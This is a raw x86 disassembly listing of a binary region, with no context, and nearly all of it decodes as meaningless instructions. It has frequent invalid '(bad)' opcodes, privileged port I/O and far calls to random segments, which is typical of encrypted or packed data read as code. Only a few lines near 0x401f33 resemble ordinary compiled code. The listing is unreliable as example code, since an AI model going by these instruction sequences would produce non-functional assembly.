  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	dec    esi
  40192e:	mov    eax,ds:0x7b4e8d2c
  401933:	jl     0x4019b1
  401935:	addr16 jle 0x4019b4
  401938:	jl     0x4018f0
  40193a:	pusha  
  40193b:	hlt    
  40193c:	add    DWORD PTR [ecx+0x6a],edi
  40193f:	icebp  
  401940:	ss or  al,0xa3
  401943:	add    eax,0x720be9bd
  401948:	call   0x70ce:0xb66d6ae5
  40194f:	sbb    ebx,esi
  401951:	lods   al,BYTE PTR ds:[esi]
  401952:	mov    dh,0x7b
  401954:	ins    DWORD PTR es:[edi],dx
  401955:	pop    edx
  401956:	inc    ebx
  401957:	mov    WORD PTR [edi],?
  401959:	or     ebx,eax
  40195b:	in     eax,dx
  40195c:	(bad)  
  40195e:	mov    es,WORD PTR [ebp-0x13]
  401961:	or     edx,ebp
  401963:	lds    ebp,FWORD PTR [ebp+0x78]
  401966:	jmp    0x7d87:0x58a9e89a
  40196d:	dec    ebp
  40196e:	cwde   
  40196f:	(bad)
  401972:	iret   
  401973:	inc    ebp
  401974:	xor    BYTE PTR [ecx-0x234f4ddb],dl
  40197a:	lahf   
  40197b:	cwde   
  40197c:	loop   0x40194c
  40197e:	jns    0x401942
  401980:	jns    0x401989
  401982:	push   cs
  401983:	sti    
  401984:	xchg   ch,dh
  401986:	or     esp,ebp
  401988:	mov    eax,0x5dfc3706
  40198d:	sbb    ecx,eax
  40198f:	shr    DWORD PTR [ecx+0x72894264],0x61
  401996:	push   ebp
  401997:	and    eax,0x238754b6
  40199c:	sar    dl,0x9a
  40199f:	push   eax
  4019a0:	push   ecx
  4019a1:	inc    edi
  4019a2:	loopne 0x401940
  4019a4:	loop   0x40199e
  4019a6:	sahf   
  4019a7:	fs mov ecx,0xf638aa19
  4019ad:	outs   dx,BYTE PTR ds:[esi]
  4019ae:	xchg   edx,eax
  4019af:	jmp    0x401992
  4019b1:	dec    esi
  4019b2:	push   esi
  4019b3:	bound  eax,QWORD PTR [edx-0x40367c93]
  4019b9:	cmp    BYTE PTR [ecx+0x3b56cac0],dh
  4019bf:	jecxz  0x401a1d
  4019c1:	fsubr  QWORD PTR [esi]
  4019c3:	fsubr  DWORD PTR [edx]
  4019c5:	sub    cl,BYTE PTR [edx+0x44]
  4019c8:	mov    cl,0xf5
  4019ca:	lock rcl dl,0xdc
  4019ce:	sbb    al,0x79
  4019d0:	push   cs
  4019d1:	xchg   edx,eax
  4019d2:	mov    ch,0x14
  4019d4:	cmp    bl,BYTE PTR [ecx+eax*2+0x53c85b1f]
  4019db:	sbb    DWORD PTR [esp+esi*1+0x3c],esi
  4019df:	cmp    al,0x9a
  4019e1:	ret    0x353b
  4019e4:	lahf   
  4019e5:	push   ebp
  4019e6:	je     0x401a59
  4019e8:	jl     0x4019b7
  4019ea:	or     bl,BYTE PTR [eax]
  4019ec:	mov    BYTE PTR ds:0x56554f11,bh
  4019f2:	shl    DWORD PTR [ecx],1
  4019f4:	sti    
  4019f5:	jmp    FWORD PTR [ebp-0x1832373c]
  4019fb:	imul   eax,DWORD PTR [esi],0x24
  4019fe:	xlat   BYTE PTR ds:[ebx]
  4019ff:	jnp    0x4019ba
  401a01:	lods   eax,DWORD PTR ss:[esi]
  401a03:	inc    edx
  401a04:	or     eax,0x9a7d5dfe
  401a09:	pxor   mm6,QWORD PTR [ecx+0x3b]
  401a0d:	or     ebx,esi
  401a0f:	dec    eax
  401a10:	cmp    eax,0x7e7aa40f
  401a15:	and    eax,esp
  401a17:	les    ecx,FWORD PTR [edx+ecx*1]
  401a1a:	mov    ah,0x38
  401a1c:	mov    dh,0xb9
  401a1e:	dec    esp
  401a1f:	pop    ds
  401a20:	sar    BYTE PTR [ebp-0x12c96cb5],0xed
  401a27:	xchg   eax,ebp
  401a29:	cmp    DWORD PTR [ebx-0x7bf2f31],ecx
  401a2f:	inc    ebx
  401a30:	xor    DWORD PTR [esi+0x38886961],esi
  401a36:	and    DWORD PTR [ecx+0x42],ebp
  401a39:	and    bl,BYTE PTR [ebp+ebx*2+0x7584a7ee]
  401a40:	xchg   esi,eax
  401a41:	mov    ebx,DWORD PTR [ebx-0x4f]
  401a44:	cmp    esi,DWORD PTR [edi-0x6e]
  401a47:	data16 aam 0x2f
  401a4a:	call   FWORD PTR [bp+si]
  401a4d:	jb     0x4019de
  401a4f:	add    al,0x42
  401a51:	sbb    al,BYTE PTR [eax-0x16ca24ef]
  401a57:	xchg   BYTE PTR [eax],cl
  401a59:	ret    0x13a4
  401a5c:	push   0x33
  401a5e:	stos   DWORD PTR es:[edi],eax
  401a5f:	es in  al,0xcd
  401a62:	icebp  
  401a63:	xchg   BYTE PTR [ecx+0x66],bh
  401a66:	fsubr  QWORD PTR [esp+ebx*4-0x2]
  401a6a:	aas    
  401a6b:	add    al,BYTE PTR [ebp-0x1bd8c61e]
  401a71:	sub    al,0x8b
  401a73:	adc    dl,al
  401a75:	and    eax,0x7651f9ba
  401a7a:	iret   
  401a7b:	inc    ebp
  401a7c:	jno    0x401a01
  401a7e:	push   0xffffff95
  401a80:	call   0x8305:0x1a4da5d4
  401a87:	fs cmp al,0x7b
  401a8a:	mov    ecx,0xd8f99d47
  401a8f:	cs cs test al,0x87
  401a93:	push   ds
  401a94:	cmp    eax,0x52e330e0
  401a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a9a:	(bad)  
  401a9b:	outs   dx,BYTE PTR ds:[esi]
  401a9c:	jg     0x401aab
  401a9e:	inc    eax
  401a9f:	or     eax,0xadd2a596
  401aa4:	shl    BYTE PTR [edi],cl
  401aa6:	int3   
  401aa7:	ret    0x18ba
  401aaa:	add    BYTE PTR [eax],bh
  401aac:	sub    dh,BYTE PTR [ebx+0x10]
  401aaf:	ret    
  401ab0:	mov    al,0x3a
  401ab2:	mov    bl,0xbd
  401ab4:	sahf   
  401ab5:	mov    bl,0x66
  401ab7:	push   ss
  401ab8:	fld    st(3)
  401aba:	jns    0x401b1a
  401abc:	lods   al,BYTE PTR ds:[esi]
  401abd:	xchg   ebp,eax
  401abe:	mov    eax,0x642d6d53
  401ac3:	imul   esp,DWORD PTR [ecx-0x12],0x46f02b84
  401aca:	mov    bl,0x4a
  401acc:	test   al,0xeb
  401ace:	aaa    
  401acf:	ins    BYTE PTR es:[edi],dx
  401ad0:	inc    eax
  401ad1:	cwde   
  401ad2:	out    dx,eax
  401ad3:	ins    DWORD PTR es:[edi],dx
  401ad4:	mov    dh,0x5f
  401ad6:	dec    esp
  401ad7:	fstp   QWORD PTR [esi-0x6d]
  401ada:	xor    edi,esi
  401adc:	pop    ss
  401add:	xchg   esi,eax
  401ade:	lds    esi,FWORD PTR [edi-0x24ec7946]
  401ae4:	inc    BYTE PTR [edi-0x34]
  401ae7:	add    dh,0x15
  401aea:	lods   al,BYTE PTR ds:[esi]
  401aeb:	fidiv  DWORD PTR [ebx+esi*8]
  401aee:	call   0x882a:0xd674e965
  401af5:	into   
  401af6:	ret    0x4830
  401af9:	sbb    dh,cl
  401afb:	push   0x7f554429
  401b00:	push   0xdc365cf7
  401b05:	scas   al,BYTE PTR es:[edi]
  401b06:	int    0xbd
  401b08:	mov    eax,DWORD PTR [edi-0x24a132dc]
  401b0e:	shl    ebx,cl
  401b10:	xor    al,0xa
  401b12:	test   eax,0x2b6daf6a
  401b17:	mov    ebx,0x3412bf00
  401b1c:	popa   
  401b1d:	and    al,0x5
  401b1f:	(bad)  
  401b22:	nop
  401b23:	xor    edx,ebp
  401b25:	jne    0x401b71
  401b27:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401b29:	icebp  
  401b2a:	mov    bh,0x9a
  401b2c:	int    0xe2
  401b2e:	pop    edx
  401b2f:	or     ecx,DWORD PTR [edx]
  401b31:	fsub   QWORD PTR [ecx]
  401b33:	pop    ebp
  401b34:	imul   ah
  401b36:	iret   
  401b37:	mov    eax,ds:0xd3461bf3
  401b3c:	aam    0x1c
  401b3e:	pop    esp
  401b3f:	aad    0xc2
  401b41:	pop    ecx
  401b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b43:	xor    DWORD PTR [ebp-0x41d426f6],edi
  401b49:	pop    esp
  401b4a:	(bad)  
  401b4b:	cmp    bl,BYTE PTR [ecx+edx*8-0x1d56094d]
  401b52:	iret   
  401b53:	xchg   esi,eax
  401b54:	jg     0x401b29
  401b56:	fstp   TBYTE PTR [edi+0x1d]
  401b59:	push   ebx
  401b5a:	mov    edi,DWORD PTR [edx+0x35]
  401b5d:	icebp  
  401b5e:	mov    ah,ah
  401b60:	sti    
  401b61:	(bad)  
  401b62:	lods   al,BYTE PTR ds:[esi]
  401b63:	popf   
  401b64:	pop    ss
  401b65:	repnz add esp,DWORD PTR ss:[esi]
  401b69:	adc    ah,0x42
  401b6c:	adc    edi,DWORD PTR [ebp-0x30d6c8ad]
  401b72:	inc    esi
  401b73:	mov    cl,0xeb
  401b75:	addr16 pop edx
  401b77:	adc    eax,0xc8d13a80
  401b7c:	xchg   edx,eax
  401b7d:	jecxz  0x401b8f
  401b7f:	neg    DWORD PTR [edi+0x59]
  401b82:	inc    esp
  401b83:	add    DWORD PTR [esi],esi
  401b85:	mov    ebx,0xbb7bfe44
  401b8a:	stc    
  401b8b:	mov    ecx,0xec05bb78
  401b90:	inc    eax
  401b91:	inc    ecx
  401b92:	cwde   
  401b93:	rcl    DWORD PTR [edi-0x3c9e13f1],1
  401b99:	jmp    0x401ba6
  401b9b:	push   cs
  401b9c:	loop   0x401b25
  401b9e:	pusha  
  401b9f:	fild   WORD PTR [eax+eiz*4]
  401ba2:	and    ecx,DWORD PTR [ebx]
  401ba4:	cli    
  401ba5:	ja     0x401c0e
  401ba7:	ds mov esp,0x71107524
  401bad:	(bad)  
  401bae:	jo     0x401b51
  401bb0:	aam    0x97
  401bb2:	push   0xe974d5aa
  401bb7:	push   cs
  401bb8:	jge    0x401bbb
  401bba:	mov    ah,BYTE PTR [edx-0x2288c28]
  401bc0:	mov    edx,0x71c5051f
  401bc5:	neg    edi
  401bc7:	(bad)  [edx+0x37]
  401bca:	loope  0x401ba9
  401bcc:	pusha  
  401bcd:	(bad)  
  401bce:	es cmp al,0xd4
  401bd1:	rcr    ebp,1
  401bd3:	sbb    cl,BYTE PTR [ebx+0x346fd563]
  401bd9:	test   al,0x87
  401bdb:	jle    0x401bad
  401bdd:	repz xor eax,0x478e00aa
  401be3:	or     bh,ch
  401be5:	rcr    bl,1
  401be7:	sbb    bl,BYTE PTR [edx]
  401be9:	xor    al,0x3d
  401beb:	pusha  
  401bec:	push   ebx
  401bed:	test   al,0x3a
  401bef:	mov    edx,0x8c9a30a7
  401bf4:	pop    edx
  401bf5:	in     eax,0xe8
  401bf7:	mov    esi,edi
  401bf9:	mov    edi,0x6ad4b698
  401bfe:	(bad)  
  401c00:	dec    eax
  401c01:	pusha  
  401c02:	mov    ebp,0xaadf0ed5
  401c07:	ins    DWORD PTR es:[edi],dx
  401c08:	fmul   st,st(2)
  401c0a:	pop    edi
  401c0b:	popa   
  401c0c:	inc    ebx
  401c0d:	xchg   DWORD PTR [edx+esi*2+0x62],edx
  401c11:	adc    esp,ebx
  401c13:	xchg   edx,eax
  401c14:	adc    DWORD PTR [edi],edx
  401c16:	cwde   
  401c17:	ins    BYTE PTR es:[edi],dx
  401c18:	push   ecx
  401c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c1a:	leave  
  401c1b:	xor    eax,DWORD PTR [esi+0x41c68837]
  401c21:	pop    ebx
  401c22:	xor    ecx,esi
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x402752df
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c4e
  401c4b:	xchg   ebx,eax
  401c4c:	mov    bl,0xfc
  401c4e:	jmp    0x401beb
  401c50:	out    0xac,al
  401c52:	cmp    esi,DWORD PTR [esp+eiz*8-0x67]
  401c56:	inc    esp
  401c57:	push   eax
  401c58:	mov    ebp,0xcbb18151
  401c5d:	leave  
  401c5e:	jl     0x401c12
  401c60:	out    dx,eax
  401c61:	adc    ch,al
  401c63:	retf   
  401c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c65:	xchg   esp,eax
  401c66:	or     eax,0x9473a80d
  401c6b:	rcl    DWORD PTR [ebx],1
  401c6d:	inc    edx
  401c6e:	mov    fs,edi
  401c70:	sbb    DWORD PTR [ebp+0x40],eax
  401c73:	ds inc edx
  401c75:	cmp    ch,0x16
  401c78:	in     al,dx
  401c79:	xor    edi,DWORD PTR [ecx-0x7b5994dd]
  401c7f:	sub    ebp,DWORD PTR [ebp+0x34dc9b55]
  401c85:	mov    ch,cl
  401c87:	adc    al,0xf0
  401c89:	shl    DWORD PTR [edi],1
  401c8b:	lock sbb DWORD PTR [edx+0x32],0x44
  401c90:	cwde   
  401c91:	retf   
  401c92:	mov    dl,BYTE PTR [esi]
  401c94:	mov    al,ds:0xbddd9640
  401c99:	in     eax,0x6a
  401c9b:	retf   0x506c
  401c9e:	mov    eax,ds:0x8e43fd2b
  401ca3:	pusha  
  401ca4:	sbb    ch,0x5e
  401ca7:	xor    eax,0xb7b15d76
  401cac:	mov    esi,0xabee7c4e
  401cb1:	pop    ebp
  401cb2:	dec    edi
  401cb3:	cmp    dh,BYTE PTR [edx]
  401cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cb6:	mov    al,ds:0x5ee0334e
  401cbb:	dec    ecx
  401cbc:	or     eax,0x897e52ea
  401cc1:	lock pcmpeqd mm6,QWORD PTR [edi-0x5a]
  401cc6:	cs fwait
  401cc8:	retf   0xe9a6
  401ccb:	or     BYTE PTR [edx],bl
  401ccd:	pop    ebx
  401cce:	call   DWORD PTR [ecx]
  401cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd1:	xchg   ecx,eax
  401cd2:	push   eax
  401cd3:	jge    0x401d04
  401cd5:	pop    ecx
  401cd6:	gs xchg ecx,eax
  401cd8:	jecxz  0x401ced
  401cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cdb:	and    DWORD PTR [esi],0x24
  401cde:	stos   DWORD PTR es:[edi],eax
  401cdf:	or     esp,eax
  401ce1:	aam    0xa
  401ce3:	dec    edi
  401ce4:	enter  0xf74a,0xcf
  401ce8:	jmp    0x401ce5
  401cea:	or     BYTE PTR [eax-0x41],ah
  401ced:	mov    DWORD PTR [eax],ebx
  401cef:	xchg   ebx,eax
  401cf0:	mov    edx,0xe98a38ce
  401cf5:	mov    ebp,0xe8b5cd7f
  401cfa:	adc    al,0x90
  401cfc:	cli    
  401cfd:	and    eax,0x9ef3b718
  401d02:	push   cs
  401d03:	ins    BYTE PTR es:[edi],dx
  401d04:	pushf  
  401d05:	(bad)  
  401d06:	pop    ebp
  401d07:	lods   al,BYTE PTR ds:[esi]
  401d08:	sti    
  401d09:	xor    BYTE PTR [ebx],0x64
  401d0c:	cmc    
  401d0d:	dec    ebp
  401d0e:	(bad)  
  401d0f:	pop    ebp
  401d10:	jl     0x401d15
  401d12:	adc    eax,DWORD PTR [ebp+0x78]
  401d15:	(bad)  [eax-0x6]
  401d18:	cmp    cx,bx
  401d1b:	cdq    
  401d1c:	pop    esi
  401d1d:	inc    edi
  401d1e:	inc    edx
  401d1f:	aam    0x17
  401d21:	adc    esp,ecx
  401d23:	or     al,0x26
  401d25:	jg     0x401d7f
  401d27:	mov    eax,0xb7186082
  401d2c:	dec    ebx
  401d2d:	test   dl,bl
  401d2f:	js     0x401cdf
  401d31:	ds jnp 0x401cbd
  401d34:	inc    edx
  401d35:	int    0xd7
  401d37:	mov    ah,0x93
  401d39:	loopne 0x401cc2
  401d3b:	in     al,dx
  401d3c:	cmp    cl,dh
  401d3e:	mov    ebx,0x3830f55b
  401d43:	ss jge 0x401d5d
  401d46:	out    dx,al
  401d47:	pusha  
  401d48:	xor    DWORD PTR [edi],eax
  401d4a:	sahf   
  401d4b:	fs xchg edx,eax
  401d4d:	inc    esp
  401d4e:	por    mm2,mm5
  401d51:	pop    ebx
  401d52:	cmp    esp,0x5e
  401d55:	aaa    
  401d56:	mov    cl,0x92
  401d58:	jmp    0x401d85
  401d5a:	lahf   
  401d5b:	mov    bh,0x2a
  401d5d:	inc    ecx
  401d5e:	adc    edi,esi
  401d60:	aas    
  401d61:	rcl    DWORD PTR [eax+0x7a],0xfb
  401d65:	and    edi,edi
  401d67:	iret   
  401d68:	gs mov bl,0xa5
  401d6b:	pop    ebx
  401d6c:	adc    dl,BYTE PTR [edx-0x41]
  401d6f:	or     al,al
  401d71:	scas   al,BYTE PTR es:[edi]
  401d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d73:	sti    
  401d74:	mov    ch,0xdd
  401d76:	retf   
  401d77:	push   cs
  401d78:	iret   
  401d79:	lds    ecx,FWORD PTR [edi+0x348a5290]
  401d7f:	out    dx,al
  401d80:	adc    BYTE PTR [eax],al
  401d82:	sub    ah,ch
  401d84:	(bad)  
  401d85:	jp     0x401df5
  401d87:	push   edx
  401d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d89:	adc    al,0xb3
  401d8b:	test   al,0xea
  401d8d:	inc    ecx
  401d8e:	sub    edx,esp
  401d90:	adc    ch,cl
  401d92:	xchg   BYTE PTR [eax-0x60],al
  401d95:	sub    bl,dl
  401d97:	push   edi
  401d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d99:	mov    es,WORD PTR [eax+0x6e6f6c29]
  401d9f:	mov    ah,0xca
  401da1:	pop    eax
  401da2:	sub    eax,0x213ea3c7
  401da7:	(bad)
  401dab:	sbb    eax,0x452718ba
  401db0:	add    ch,ch
  401db2:	jbe    0x401d7d
  401db4:	mov    WORD PTR [edi+0x374ce995],?
  401dba:	int3   
  401dbb:	pop    ds
  401dbc:	inc    ecx
  401dbd:	popa   
  401dbe:	in     ax,0x5d
  401dc1:	stos   BYTE PTR es:[edi],al
  401dc2:	xor    BYTE PTR ds:0x68e6164e,bl
  401dc8:	ret    0x2313
  401dcb:	add    al,0x2
  401dcd:	dec    ecx
  401dce:	jo     0x401e2c
  401dd0:	rcl    DWORD PTR [edx+0x1a],cl
  401dd3:	cmp    al,0x8e
  401dd5:	push   0x3fca4cd6
  401dda:	stc    
  401ddb:	(bad)  
  401ddc:	inc    DWORD PTR [esi]
  401dde:	out    0x7,eax
  401de0:	mov    bl,0x82
  401de2:	ror    DWORD PTR [ecx],cl
  401de4:	mov    cl,0x3a
  401de6:	mov    bl,0x4b
  401de8:	dec    BYTE PTR [eax+0x79]
  401deb:	mov    ebx,DWORD PTR [edx]
  401ded:	xchg   DWORD PTR [eax+eiz*1],ecx
  401df0:	jae    0x401d96
  401df2:	pop    ebp
  401df3:	rol    BYTE PTR [esi],1
  401df5:	jnp    0x401dbf
  401df7:	(bad)  
  401df8:	jle    0x401db8
  401dfa:	sub    eax,0xc2711ed3
  401dff:	cmp    al,0xe7
  401e01:	cmp    BYTE PTR [edx-0x72f6d02],ch
  401e07:	or     eax,0xc190e443
  401e0c:	lds    esi,FWORD PTR [ebx]
  401e0e:	aad    0x82
  401e10:	jae    0x401da0
  401e12:	inc    esp
  401e13:	shl    BYTE PTR [ebx],0x9
  401e16:	adc    DWORD PTR [esi-0x62],esp
  401e19:	call   0x5acf:0x43334c38
  401e20:	xchg   esi,eax
  401e21:	jmp    0xca1f8280
  401e26:	mov    WORD PTR [ecx-0x2b],ds
  401e29:	mov    dh,0x5f
  401e2b:	jbe    0x401e96
  401e2d:	cmp    eax,0xa9d7b871
  401e32:	or     al,0xb3
  401e34:	push   esp
  401e35:	or     eax,0xa9c96079
  401e3a:	das    
  401e3b:	cmova  edx,DWORD PTR gs:[edx-0x6638f4e9]
  401e43:	lahf   
  401e44:	push   eax
  401e45:	cdq    
  401e46:	out    dx,al
  401e47:	repz lahf 
  401e49:	inc    edi
  401e4a:	pusha  
  401e4b:	nop
  401e4c:	aas    
  401e4d:	fs idiv ah
  401e50:	scas   eax,DWORD PTR es:[edi]
  401e51:	and    al,BYTE PTR [edi-0x7e]
  401e54:	stos   BYTE PTR es:[edi],al
  401e55:	sub    DWORD PTR [eax+0x7a],ecx
  401e58:	ret    0x9321
  401e5b:	pop    edx
  401e5c:	sbb    dh,BYTE PTR [esi-0x7a96242f]
  401e62:	add    eax,0xf44b494e
  401e67:	std    
  401e68:	xor    eax,0xfd2247cb
  401e6d:	rcr    DWORD PTR ds:0xc0589d47,0x9a
  401e74:	pop    es
  401e75:	int3   
  401e76:	sub    dh,bh
  401e78:	mov    al,0x30
  401e7a:	lea    edx,cs:[esi-0x47]
  401e7e:	aam    0xe9
  401e80:	stos   BYTE PTR es:[edi],al
  401e81:	mov    edi,0x1bcc9e91
  401e86:	jmp    0x778e:0x5181ac8
  401e8d:	cmp    eax,0x36d2ba06
  401e92:	mov    DWORD PTR [edi],eax
  401e94:	pop    edx
  401e95:	addr16 jo 0x401ee0
  401e98:	xor    ecx,DWORD PTR [edi+0x701ec1ec]
  401e9e:	jl     0x401e86
  401ea0:	fidivr DWORD PTR [ebx-0x5f0e9dd9]
  401ea6:	arpl   WORD PTR [edi],si
  401ea8:	test   DWORD PTR [ecx],edx
  401eaa:	jne    0x401f28
  401eac:	dec    ebx
  401ead:	dec    ecx
  401eae:	pop    ss
  401eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb0:	adc    al,bh
  401eb2:	inc    ah
  401eb4:	out    0x32,al
  401eb6:	xchg   edi,eax
  401eb7:	dec    ebp
  401eb8:	ss pop ecx
  401eba:	lock gs cmp eax,0x1732be7
  401ec1:	(bad)  
  401ec3:	into   
  401ec4:	mov    al,ds:0x5a92800e
  401ec9:	(bad)  
  401eca:	scas   al,BYTE PTR es:[edi]
  401ecb:	jne    0x401e9e
  401ecd:	js     0x401ef4
  401ecf:	push   ebx
  401ed0:	xchg   edx,eax
  401ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ed2:	dec    DWORD PTR [esi]
  401ed4:	sti    
  401ed5:	jo     0x401ea3
  401ed7:	call   0xfc10:0x53b20185
  401ede:	rcl    DWORD PTR [ebx-0x35],0xa6
  401ee2:	or     BYTE PTR [eax],dh
  401ee4:	call   0xe114a7ac
  401ee9:	cmpps  xmm2,XMMWORD PTR [edi+0x74d1f3da],0xba
  401ef1:	aam    0xda
  401ef3:	(bad)  
  401ef5:	stos   BYTE PTR es:[edi],al
  401ef6:	or     al,0xe4
  401ef8:	ror    BYTE PTR [esi],1
  401efa:	popf   
  401efb:	(bad)  
  401efc:	cmp    BYTE PTR [ecx+0x27],cl
  401eff:	out    dx,eax
  401f00:	sub    eax,0xc35bd3b3
  401f05:	retf   
  401f06:	inc    esp
  401f07:	add    edi,DWORD PTR [ebp+0x637e48f8]
  401f0d:	dec    eax
  401f0e:	adc    al,0x6e
  401f10:	fidivr WORD PTR [esi-0x4acbfba6]
  401f16:	clc    
  401f17:	stos   DWORD PTR es:[edi],eax
  401f18:	xor    ah,BYTE PTR [eax-0x4d38c4e7]
  401f1e:	cs daa 
  401f20:	mov    cl,0xb0
  401f22:	jno    0x401ef3
  401f24:	mov    ds:0x8acbe0cf,al
  401f29:	test   al,0x59
  401f2b:	(bad)  
  401f2c:	dec    eax
  401f2d:	push   DWORD PTR [eax+0x1583cbcb]
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0x91e1b350
  401f5d:	neg    DWORD PTR [eax+0x677c7c01]
  401f63:	jle    0x401fe1
  401f65:	jl     0x401ef3
  401f67:	ret    
  401f68:	cmp    eax,0x4d57807d
  401f6d:	dec    eax
  401f6e:	pushf  
  401f6f:	(bad)  
  401f70:	adc    ch,dl
  401f72:	xchg   edx,eax
  401f73:	pusha  
  401f74:	dec    edi
  401f75:	jb     0x401f85
  401f77:	into   
  401f78:	je     0x401fdd
  401f7a:	sub    DWORD PTR [esp+ebp*8-0xb],edx
  401f7e:	ins    BYTE PTR es:[edi],dx
  401f7f:	int3   
  401f80:	call   0xb189538d
  401f85:	loopne 0x401f9c
  401f87:	adc    edi,DWORD PTR [eax-0x6e]
  401f8a:	ret    0xa371
  401f8d:	jp     0x401ffa
  401f8f:	iret   
  401f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f91:	or     cl,bl
  401f93:	test   eax,0x825ad76c
  401f98:	cmp    BYTE PTR [ebp-0x3a],ch
  401f9b:	arpl   dx,di
  401f9d:	jecxz  0x401f9a
  401f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa0:	(bad)
  401fa4:	aam    0x4d
  401fa6:	jns    0x401f8e
  401fa8:	aaa    
  401fa9:	or     DWORD PTR [ebp-0x1d],eax
  401fac:	mov    ds:0x12287d9b,al
  401fb1:	dec    ecx
  401fb2:	loope  0x401f49
  401fb4:	inc    edi
  401fb5:	jne    0x401f89
  401fb7:	cmp    dh,BYTE PTR [edi-0x6147a608]
  401fbd:	jmp    0xbb2cf3b6
  401fc2:	es ss or eax,0x1b1fe091
  401fc9:	mov    eax,0x9244b8f1
  401fce:	pop    ebp
  401fcf:	ja     0x401f85
  401fd1:	and    BYTE PTR [edi+0x35],0x50
  401fd5:	sbb    ch,BYTE PTR ds:0x876d5e60
  401fdb:	stc    
  401fdc:	repnz or cl,BYTE PTR ds:0x9a56f9d8
  401fe3:	rol    BYTE PTR [edi+0x1896b92e],1
  401fe9:	mov    edx,0x2760bfd5
  401fee:	call   0x83a3:0x2093de15
  401ff5:	rep stos DWORD PTR es:[edi],eax
  401ff7:	lods   al,BYTE PTR ds:[esi]
  401ff8:	pop    edi
  401ff9:	rcr    ch,1
  401ffb:	dec    edx
  401ffc:	xor    dh,cl
  401ffe:	inc    esi
  401fff:	adc    BYTE PTR [edx],bh
  402001:	pop    eax
  402002:	cli    
  402003:	in     eax,dx
  402004:	jge    0x401fd0
  402006:	sbb    al,0x34
  402008:	sbb    cl,BYTE PTR ds:[ecx]
  40200b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40200c:	dec    eax
  40200d:	mov    esp,0x998825ab
  402012:	test   al,0xf3
  402014:	xchg   esp,eax
  402015:	enter  0x82ca,0x27
  402019:	add    al,BYTE PTR [edi-0x7ca0891a]
  40201f:	sbb    eax,0xbd2dbf1b
  402024:	rcl    esi,0x88
  402027:	push   edx
  402028:	xchg   ebx,eax
  402029:	pop    edx
  40202a:	xor    BYTE PTR [ecx*1-0x7d043e62],bh
  402031:	outs   dx,DWORD PTR ds:[esi]
  402032:	and    esi,DWORD PTR [ebx+0x11a6f041]
  402038:	loop   0x402070
  40203a:	out    0x95,eax
  40203c:	into   
  40203d:	in     al,dx
  40203e:	mov    dh,BYTE PTR [eax+0xe76c126]
  402044:	jne    0x402081
  402046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402047:	or     DWORD PTR [ebx],0xffffff8f
  40204a:	cld    
  40204b:	add    ebp,DWORD PTR [ebp-0x6486ecbb]
  402051:	push   edi
  402052:	scas   al,BYTE PTR es:[edi]
  402053:	jns    0x401ff1
  402055:	repz inc esi
  402057:	call   0xf0c8dabf
  40205c:	(bad)  
  40205d:	(bad)  
  40205e:	stos   DWORD PTR es:[edi],eax
  40205f:	ror    BYTE PTR [esi+0x7b],cl
  402062:	mov    edx,0xff24b036
  402067:	inc    ebp
  402068:	hlt    
  402069:	lahf   
  40206a:	pushf  
  40206b:	and    edx,DWORD PTR [bx+di]
  40206e:	les    eax,FWORD PTR [ecx+ebx*8-0x587941a8]
  402075:	lea    ebx,[eax]
  402077:	daa    
  402078:	sub    BYTE PTR [edx],dh
  40207a:	bound  edi,QWORD PTR [ebp-0xa]
  40207d:	mov    edx,0xbe8d4b89
  402082:	pop    eax
  402083:	popf   
  402084:	fsubr  QWORD PTR [ebp-0x5a]
  402087:	jge    0x4020f1
  402089:	aam    0x5d
  40208b:	in     al,dx
  40208c:	dec    ebp
  40208d:	sub    DWORD PTR [eax],ebx
  40208f:	sbb    al,BYTE PTR [ebx+0x45]
  402092:	adc    al,0x1c
  402094:	test   DWORD PTR [eax+ebp*8-0x6d8b0ee7],esp
  40209b:	(bad)  
  40209c:	aam    0xf5
  40209e:	push   ss
  40209f:	dec    ebp
  4020a0:	sar    BYTE PTR [ecx-0x44911d11],cl
  4020a6:	jl     0x402067
  4020a8:	imul   ebp,ebx,0xffffffb6
  4020ab:	mov    BYTE PTR [edx-0x68c0186],cl
  4020b1:	stos   BYTE PTR es:[edi],al
  4020b2:	aam    0x57
  4020b4:	sbb    eax,eax
  4020b6:	mov    edx,0x697b866
  4020bb:	jl     0x4020d7
  4020bd:	jmp    0xb88895de
  4020c2:	xchg   ebp,eax
  4020c3:	int3   
  4020c4:	das    
  4020c5:	out    dx,eax
  4020c6:	jle    0x4020d1
  4020c8:	xchg   edi,eax
